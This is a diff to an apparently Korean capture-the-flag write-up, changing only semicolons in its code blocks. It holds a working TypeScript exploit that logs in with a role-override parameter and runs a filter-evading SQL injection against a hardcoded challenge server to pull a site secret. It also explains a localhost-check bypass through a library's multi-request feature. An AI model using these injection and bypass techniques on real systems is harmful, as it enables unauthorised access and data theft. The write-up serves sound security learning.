@@ -246,16 +246,16 @@ fun filterQuery(query: String): String {
 최종적인 익스 코드는 아래와 같다.
 
 ```typescript
-import axios from 'axios'
-import { stringify, parse } from 'qs'
+import axios from 'axios';
+import { stringify, parse } from 'qs';
 
 const instance = axios.create({
 	baseURL: 'http://13.125.48.233:8780'
-})
+});
 
-const csrfTokenRes = await instance.get('/user/login')
-const csrfToken = csrfTokenRes.data.match(/value="(.+)"/)[1]
-let TOKEN = csrfTokenRes.headers['set-cookie']?.[0].split(';')[0]
+const csrfTokenRes = await instance.get('/user/login');
+const csrfToken = csrfTokenRes.data.match(/value="(.+)"/)[1];
+let TOKEN = csrfTokenRes.headers['set-cookie']?.[0].split(';')[0];
 const loginRes = await instance.post(
 	'/user/login?ShieldParam=%7B%22userasdf_role%22%3Anull%7D',
 	stringify({
@@ -271,29 +271,29 @@ const loginRes = await instance.post(
 		},
 		validateStatus: (status) => status === 302
 	}
-)
+);
 
-TOKEN = loginRes.headers['set-cookie']?.[0].split(';')[0]
+TOKEN = loginRes.headers['set-cookie']?.[0].split(';')[0];
 
 await instance.get('/api/v6/shieldosint/query', {
 	params: { q: 'Y' },
 	headers: { cookie: TOKEN }
-})
+});
 
-const sql = `UNION(SELECT(sdata)FROM(SITE_SECRET))`
-console.info(sql.length)
+const sql = `UNION(SELECT(sdata)FROM(SITE_SECRET))`;
+console.info(sql.length);
 await instance
 	.get('/api/v6/shieldosint/search', {
 		params: { s: 'filterQuery', q: `a a ${sql}`, mp: 'string' },
 		headers: { cookie: TOKEN }
 	})
-	.then((v) => console.log(v.data.replace('Query Result: ', '').length))
+	.then((v) => console.log(v.data.replace('Query Result: ', '').length));
 await instance
 	.get('/api/v6/shieldosint/search', {
 		params: { s: 'selectQuery', q: `a a ${sql}`, mp: 'string' },
 		headers: { cookie: TOKEN }
 	})
-	.then((v) => console.log(v.data.replace('Query Result: ', '')))
+	.then((v) => console.log(v.data.replace('Query Result: ', '')));
 ```
 
 ~~플래그를 안 적어뒀다 ㅠㅠ~~
@@ -431,8 +431,8 @@ with open('img1.jpeg', 'rb') as file_a, open('img2.jpeg', 'rb') as file_b:
 먼저 **secret.js**를 봐보자.
 
 ```javascript
-var g = require('dyson-generators')
-var realFlag = require('fs').readFileSync('/flag.txt').toString()
+var g = require('dyson-generators');
+var realFlag = require('fs').readFileSync('/flag.txt').toString();
 
 module.exports = {
 	path: '/api/flagService',
@@ -441,13 +441,13 @@ module.exports = {
 	template: {
 		flag: function (req) {
 			let guessPassword = false,
-				guessFlag = false
+				guessFlag = false;
 			try {
 				if (
 					req.socket.remoteAddress.replace(/^.*:/, '') != '127.0.0.1' &&
 					req.socket.remoteAddress.replace(/^.*:/, '') != '1.3.3.7'
 				) {
-					return 'Try Again!!'
+					return 'Try Again!!';
 				}
 
 				if (
@@ -455,25 +455,25 @@ module.exports = {
 					typeof req.query.guess !== 'string' &&
 					req.query.guess.length > 3
 				) {
-					return 'Try Again!!'
+					return 'Try Again!!';
 				}
 
 				const SuperSecretPassword = ('[REDACTED]'[(guessPassword, guessFlag)] =
-					req.query.guess !== undefined ? atob(req.query.guess).split('|') : ['idk', 'idk'])
+					req.query.guess !== undefined ? atob(req.query.guess).split('|') : ['idk', 'idk']);
 				if (SuperSecretPassword == guessPassword) {
-					return realFlag
+					return realFlag;
 				} else if (realFlag == guessFlag) {
-					return realFlag
+					return realFlag;
 				} else {
-					return 'Try Again!!'
+					return 'Try Again!!';
 				}
 			} catch {
-				return 'Try Again!!'
+				return 'Try Again!!';
 			}
 		},
 		status: 'OK'
 	}
-}
+};
 ```
 
 **/api/flagService**로 요청을 받으며, **localhost**이면서 **SuperSecretPassword**와 **guessPassword**가 같거나, **realFlag**와 **guessFlag**가 같으면 **flag**를 반환한다. 그러나 이는 일반적으로는 우회가 불가능하다. **SuperSecretPassword**는 풀이자가 알 수 없도록 길 것이며, **realFlag**는 **sha256**으로 해싱되어 있을 거기 때문이다.
@@ -481,46 +481,46 @@ module.exports = {
 일단 다른 정보들도 얻어보자. 먼저, **Dockerfile**을 보면 [dyson-demo](https://github.com/webpro/dyson-demo)를 가져오는 것을 알 수 있다. 이는 **dyson**을 활용한 앱임을 알 수 있으며, **dyson**은 **multi request**를 지원하는 라이브러리이다.
 
 ```javascript
-const http = require('http')
+const http = require('http');
 
 const isMultiRequest = (path, options) => {
-	const delimiter = options.multiRequest
-	return delimiter ? path.split('/').find((fragment) => fragment.includes(delimiter)) : false
-}
+	const delimiter = options.multiRequest;
+	return delimiter ? path.split('/').find((fragment) => fragment.includes(delimiter)) : false;
+};
 
 const doMultiRequest = (req, path) => {
-	const options = req.app.get('dyson_options')
-	const { err } = req.app.get('dyson_logger')
-	const [hostname, port] = req.headers.host.split(':')
-	const delimiter = options.multiRequest
-	const range = isMultiRequest(path, options)
+	const options = req.app.get('dyson_options');
+	const { err } = req.app.get('dyson_logger');
+	const [hostname, port] = req.headers.host.split(':');
+	const delimiter = options.multiRequest;
+	const range = isMultiRequest(path, options);
 
 	return range.split(delimiter).map((id, index, list) => {
-		const url = path.replace(list, id)
-		let data = ''
+		const url = path.replace(list, id);
+		let data = '';
 
 		return new Promise((resolve, reject) => {
 			http
 				.get({ hostname, port, path: url }, (res) => {
 					res.on('data', (chunk) => {
-						data += chunk
-					})
+						data += chunk;
+					});
 					res.on('end', () => {
-						resolve(JSON.parse(data))
-					})
+						resolve(JSON.parse(data));
+					});
 				})
 				.on('error', (error) => {
-					err(error.message)
-					reject(error)
-				})
-		})
-	})
-}
+					err(error.message);
+					reject(error);
+				});
+		});
+	});
+};
 
 module.exports = {
 	isMultiRequest,
 	doMultiRequest
-}
+};
 ```
 
 이를 통해서 일단, **localhost** 필터링을 우회할 수 있다.
@@ -529,7 +529,7 @@ module.exports = {
 
 ```javascript
 const SuperSecretPassword = ('[REDACTED]'[(guessPassword, guessFlag)] =
-	req.query.guess !== undefined ? atob(req.query.guess).split('|') : ['idk', 'idk'])
+	req.query.guess !== undefined ? atob(req.query.guess).split('|') : ['idk', 'idk']);
 ```
 
 와
@@ -538,7 +538,7 @@ const SuperSecretPassword = ('[REDACTED]'[(guessPassword, guessFlag)] =
 const SuperSecretPassword =
 	/*"[REDACTED]" [guessPassword, guessFlag] =*/ req.query.guess !== undefined
 		? atob(req.query.guess).split('|')
-		: ['idk', 'idk']
+		: ['idk', 'idk'];
 ```
 
 는 **ASI**의 misbehavior로 인해, 같은 코드로 인식된다. 따라서, **http://url:port/user?,api/flagService?guess=**로 요청을 하면 **flag**를 얻을 수 있다. (물론 아래 사진과 같이, **host**를 변경해야 한다.)
